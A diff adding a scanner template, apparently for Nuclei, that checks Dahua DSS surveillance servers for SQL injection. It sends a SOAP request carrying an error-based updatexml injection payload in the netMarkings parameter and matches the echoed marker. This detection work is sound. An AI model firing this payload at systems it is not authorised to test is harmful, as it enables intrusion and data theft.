@@ -1,0 +1,49 @@
+id: dahua-dss-sql-injection
+info:
+  name: Dahua DSS Digital Surveillance System SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection,dahua,dss
+  description: |
+    Dahua DSS digital surveillance system is vulnerable to SQL injection on the /portal/services/itcBulletin endpoint via the netMarkings parameter. An attacker can inject malicious SQL payloads to extract sensitive database information.
+  reference:
+    - https://www.dahuatech.com
+
+variables:
+  check_string: "{{rand_base(8)}}"
+  payload: |
+    <s11:Envelope xmlns:s11='http://schemas.xmlsoap.org/soap/envelope/'>
+      <s11:Body>
+        <ns1:deleteBulletin xmlns:ns1='http://itcbulletinservice.webservice.dssc.dahua.com'>
+          <netMarkings>
+            (updatexml(1,concat(0x7e,(select 0x{{hex_encode(check_string)}}),0x7e),1))
+          </netMarkings>
+        </ns1:deleteBulletin>
+      </s11:Body>
+    </s11:Envelope>
+
+http:
+  - raw:
+      - |
+        POST /portal/services/itcBulletin?wsdl HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+        Accept-Encoding: gzip, deflate
+        Connection: close
+
+        {{payload}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "XPATH syntax error"
+        part: body
+      - type: regex
+        regex:
+          - "~([a-fA-F0-9]{8})~"
+        part: body
+    extractors:
+      - type: regex
+        group: 1
+        regex:
+          - "~([a-fA-F0-9]{8})~"
